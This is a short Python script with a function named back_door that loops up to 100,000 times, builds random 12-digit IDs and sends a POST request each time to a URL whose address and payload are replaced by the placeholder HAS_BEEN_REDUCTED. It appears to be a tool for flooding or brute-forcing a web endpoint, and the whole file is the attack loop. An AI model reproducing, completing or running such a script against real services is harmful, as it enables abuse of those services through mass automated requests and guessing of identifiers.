import requests
from random import choice


def back_door():
    print("Started")
    i = 0
    while i <= 100000:
        i += 1
        id = ''.join(choice('0123456789') for s in range(12))
        payload = HAS_BEEN_REDUCTED
        url = HAS_BEEN_REDUCTED
        r = requests.post(url, data=payload, timeout=300)
        print(i)


back_door()
